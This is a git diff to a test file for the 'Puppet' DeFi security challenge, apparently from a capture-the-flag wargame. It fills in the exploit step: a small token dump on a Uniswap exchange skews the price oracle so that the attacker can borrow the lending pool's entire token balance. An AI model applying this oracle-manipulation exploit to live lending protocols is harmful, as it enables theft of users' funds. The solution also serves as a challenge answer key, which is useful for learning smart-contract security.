@@ -54,7 +54,7 @@ describe('[Challenge] Puppet', function () {
             this.uniswapExchange.address,
             { from: deployer }
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -93,11 +93,23 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.approve(
+            this.uniswapExchange.address,
+            ether('1'),
+            { from: attacker }
+        )
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await this.uniswapExchange.tokenToEthSwapInput(
+            ether('1'),
+            1,
+            deadline,
+            { from: attacker }
+        );
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, { from: attacker })
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
         // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
@@ -105,7 +117,6 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.bignumber.eq('0');
-        
         // Attacker ETH balance has not decreased
         expect(
             await balance.current(attacker)
